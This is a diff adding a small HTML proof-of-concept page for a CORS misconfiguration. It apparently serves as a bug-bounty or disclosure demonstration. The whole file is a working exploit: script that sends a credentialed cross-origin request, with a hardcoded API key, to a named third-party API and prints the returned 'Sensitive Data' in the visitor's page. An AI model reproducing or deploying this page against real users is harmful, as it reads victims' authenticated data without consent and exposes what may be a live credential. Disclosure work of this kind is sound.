@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Misconfig PoC</title>
+</head>
+<body>
+  <h1>CORS Exploit PoC</h1>
+  <script>
+    fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
+      }
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("Sensitive Data:", data);
+      document.body.innerHTML += "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
+    })
+    .catch(err => console.error("Fetch error", err));
+  </script>
+</body>
+</html>
